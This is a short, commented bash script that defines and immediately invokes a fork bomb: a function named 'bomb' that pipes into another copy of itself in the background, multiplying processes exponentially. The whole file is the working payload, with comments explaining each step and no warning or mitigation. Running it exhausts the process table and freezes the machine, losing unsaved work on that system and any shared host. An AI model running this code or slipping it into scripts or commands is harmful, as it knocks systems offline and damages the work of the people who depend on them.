# Define a function named 'bomb'
bomb() {
    # Inside the function:
    # 1. Call 'bomb' again
    # 2. Pipe its output to another call of 'bomb'
    # 3. The '&' runs the entire command sequence in the background, allowing concurrent execution
    bomb | bomb &
}

# Call the function for the first time to start the exponential replication
bomb

